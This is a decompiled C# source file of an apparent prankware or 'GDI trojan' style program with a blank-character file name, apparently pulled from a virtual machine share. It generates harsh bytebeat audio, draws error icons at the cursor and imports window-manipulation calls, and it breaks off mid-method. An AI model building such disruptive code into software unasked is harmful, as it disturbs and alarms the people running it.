// Decompiled with JetBrains decompiler
// Type: Tera_Bonus.Program
// Assembly: ⠀, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D0708EAF-DBFF-4047-8796-B1F7AB78F6FA
// Assembly location: \\VBOXSVR\B4s3\Private\⠀.exe

using HC;
using HC.Properties;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

#nullable disable
namespace Tera_Bonus;

internal static class Program
{
  public class Driwer : Control
  {
  }

  private class er1 : Program.Driwer
  {
    private Point cursorPosition;
    private static Random random = new Random();
    private const int SW_HIDE = 0;
    private const int SW_SHOW = 1;
    private static Form1 mainForm;
    public const int AC_SRC_OVER = 0;

    protected override void OnPaint(PaintEventArgs e)
    {
      base.OnPaint(e);
      this.DrawErrorIcon(e.Graphics);
    }

    protected override void OnMouseMove(MouseEventArgs e)
    {
      base.OnMouseMove(e);
      this.cursorPosition = e.Location;
      this.Invalidate();
    }

    private void DrawErrorIcon(Graphics g)
    {
      Icon error = SystemIcons.Error;
      g.DrawIcon(error, this.cursorPosition.X - error.Width / 2, this.cursorPosition.Y - error.Height / 2);
    }

    [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
    private static extern int ExtractIconEx(
      string sFile,
      int iIndex,
      out IntPtr piLargeVersion,
      out IntPtr piSmallVersion,
      int amountIcons);

    public static Icon Extract(string file, int number, bool largeIcon)
    {
      IntPtr piLargeVersion;
      IntPtr piSmallVersion;
      Program.er1.ExtractIconEx(file, number, out piLargeVersion, out piSmallVersion, 1);
      try
      {
        return Icon.FromHandle(largeIcon ? piLargeVersion : piSmallVersion);
      }
      catch
      {
        return (Icon) null;
      }
    }

    public static Program.er1.RGB HSLToRGB(Program.er1.HSL hsl)
    {
      byte b;
      byte g;
      byte r;
      if ((double) hsl.S == 0.0)
      {
        int num;
        b = (byte) (num = (int) (byte) ((double) hsl.L * (double) byte.MaxValue));
        g = (byte) num;
        r = (byte) num;
      }
      else
      {
        float vH = (float) hsl.H / 360f;
        float v2 = (double) hsl.L < 0.5 ? hsl.L * (1f + hsl.S) : (float) ((double) hsl.L + (double) hsl.S - (double) hsl.L * (double) hsl.S);
        float v1 = 2f * hsl.L - v2;
        r = (byte) ((double) byte.MaxValue * (double) Program.er1.HueToRGB(v1, v2, vH + 0.333333343f));
        g = (byte) ((double) byte.MaxValue * (double) Program.er1.HueToRGB(v1, v2, vH));
        b = (byte) ((double) byte.MaxValue * (double) Program.er1.HueToRGB(v1, v2, vH - 0.333333343f));
      }
      return new Program.er1.RGB(r, g, b);
    }

    private static float HueToRGB(float v1, float v2, float vH)
    {
      if ((double) vH < 0.0)
        ++vH;
      if ((double) vH > 1.0)
        --vH;
      if (6.0 * (double) vH < 1.0)
        return v1 + (float) (((double) v2 - (double) v1) * 6.0) * vH;
      if (2.0 * (double) vH < 1.0)
        return v2;
      return 3.0 * (double) vH < 2.0 ? v1 + (float) (((double) v2 - (double) v1) * (0.66666668653488159 - (double) vH) * 6.0) : v1;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    private static extern bool SetWindowText(IntPtr hWnd, string text);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    internal static extern bool MoveWindow(
      IntPtr hWnd,
      int X,
      int Y,
      int nWidth,
      int nHeight,
      bool bRepaint);

    public static int GetSomeRandomNumber(int min, int max)
    {
      return new ThreadLocal<Random>((Func<Random>) (() => new Random())).Value.Next(min, max);
    }

    private static void byte1(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 2; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) ((index * index + 2) / ((index >> 10) + 2)) / 40.75) + 128.0);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte2(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) ((index * index + 2) / ((index >> 16 /*0x10*/) + 2));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte3(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) (index * (index >> 9 | 9) * index >> 12)) + 128.0);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte4(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) (index * index >> 10)) * Math.Sin((double) (index * (index & index >> 10))) + 128.0);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte5(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) ((double) (index * index >> 8) * Math.Sqrt((double) (index & index >> 8)));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte6(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        random.Next(1, 8);
        for (int a = 0; a < numArray.Length; ++a)
          numArray[a] = (byte) (128.0 * Math.Sin((double) a) + 128.0 * Math.Sin((double) (a / 5120)));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte7(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) (129 * index % ((index >> 7) + 2))) + 128.0 * Math.Sin((double) ((index + 2) / (index + 2))));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte8(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        random.Next(8);
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) (129 * (index >> 10))) + 128.0 * Math.Sin((double) (index * index * index)));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte9(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) (index / 512 /*0x0200*/)) * Math.Sin((double) (index * (index >> 8 | index << 5)) / 40.75));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte10(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) ((17 * index | (index >> 2) + (Convert.ToBoolean(index & 32768 /*0x8000*/) ? 13 : 14) * index | index >> 3 | index >> 5) * index >> 16 /*0x10*/)) + 128.0);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte11(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) (index ^ index % 1001 + index ^ index % 1002)) + 128.0);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte12(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) (index * ((index >> 10 | index % 16 /*0x10*/ * index >> 5) & 8 * index >> 12 & 18) * index >> 16 /*0x10*/) / 40.75));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte13(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) (index * (index | index >> 5)) / 40.75) + 128.0);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte14(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (Math.Sqrt(128.0 * Math.Sin((double) (((index & index >> 6) + (index | index >> 8) + (index | index >> 7) + (index | index >> 9)) * index >> 16 /*0x10*/))) - 9.0);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte15(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int d = 0; d < numArray.Length; ++d)
          numArray[d] = (byte) ((d ^ d - d + 12 * (int) Math.Cos((double) d) - 12 * (int) Math.Tan((double) (d >> 9))) * d >> 16 /*0x10*/);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte16(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (1.0015 * Math.Sin((double) (index * (int) "66546657"[index >> 13 & 7] + 2)) + (double) (2 / ((index >> 1) + 2) % ((index * index >> 6) + 2)));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte17(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) (128.0 * Math.Sin((double) ((int) "2230290303535332929303030290302218182211"[(index >> 12) % 32 /*0x20*/] * index & 192 /*0xC0*/)) / 2.0 + (double) ((int) "020202030"[(index >> 13) % 8] * index >> 2 & 128 /*0x80*/) + 128.0);
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte18(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) ((double) (index % (int) short.MaxValue >> 5) * Math.Sin((double) ((int) "1511215191511243543"[(index >> 13) % 16 /*0x10*/] * index)));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte19(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) ((double) (index % (int) short.MaxValue >> 5) * Math.Sin((double) (index * (index >> 9 | 9))));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
